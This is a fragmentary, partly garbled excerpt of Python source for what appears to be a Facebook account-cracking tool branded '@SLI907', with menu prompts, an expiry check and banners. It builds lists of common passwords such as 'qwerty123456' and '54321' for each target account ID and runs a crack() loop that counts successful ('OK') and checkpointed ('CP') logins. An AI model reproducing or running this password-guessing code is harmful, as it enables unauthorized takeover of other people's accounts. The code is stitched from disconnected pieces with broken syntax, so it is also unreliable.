...
an2 = datetime.datetime(2500,9,18)
hours = (now.hour)
if an > an2 or an == an2:
 ...
 print('⌁'*60)
 print('\033[2;36m\nTime expires : '+ str(an2))
 print('')
 print('⌁'*60)
 print('\033[93m 𓆩⌁   @SLI907  ⊹𓆪')
 print('\n\033[1;37m wait to tool Facebook and PUBG')
 DeKo = '''''''''''print('⌁'50)'''''''''''
...
import sys
import time
import datetime;now = datetime.date.today();target = datetime.date(2024,9,18)
if now >=target:print("  @SLI907⊹")
...
def login_lagi334():
    try:
        ...
        print(f'  {x}[{h}•{x}]{h}  reset tool !!!{x} ');time.sleep(1)
        exit()
...
#        method.append('touch')
        ...
        method.append('mobile')
    print('')
    _jembot_ = input('\033[2;36m 𝐀𝐃𝐃 𝐀𝐏𝐏 : Show linked apps ( 𓆩Y𓆪/𓆩T𓆪 )')
    if _jembot_ in ['']:
        ...
        taplikasi.append('no')
    pwplus=input('\033[2;33m 𝐏𝐀𝐒𝐒𝐖𝐎𝐑𝐃 𝐌𝐀𝐍𝐔𝐀𝐋 ➪ password Manual (𓆩T𓆪 random( 𓆩Y𓆪/𓆩T𓆪 ) ')
    if pwplus in ['y','Y']:
        pwpluss.append('ya')
        ...
        for yuzong in id2:
            ...
            if len(nmf)<6:
                if len(frs)<3:
                    ...
                    pwv.append('zzxxccvv')
                    pwv.append('zzzzxxxx')
                    pwv.append('11223344556677889900')
                    pwv.append('qwerty123456')
                    pwv.append('54321')
                    pwv.append('nnnnmmmm')
                    pwv.append('oooopppp')
                    pwv.append('mnbvcxzasdfghjkl')
                    pwv.append('102030405060708090')
                    pwv.append('ahahah123')
                    pwv.append('1020304050')
...
def crack(idf,pwv):
    ...
    print('\r%s [RDF] %s/%s ⌁ [OK] %s ⌁ [CP] %s ⌁ %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
...
▬▬▬▬▬▬▬ @SLI907  ✯▬▬▬▬▬▬    
 ...
 '''
                    ...
                    cetak(nel(statuscp1, title='I hope you get it right'))
...
▬▬▬▬▬▬▬▬  @SLI907  ✯▬▬▬▬▬▬    
 𝐁𝐘 : @SLI907
  ...
  '''
                    ...
                    cetak(nel(statusok1, title='You wish '))
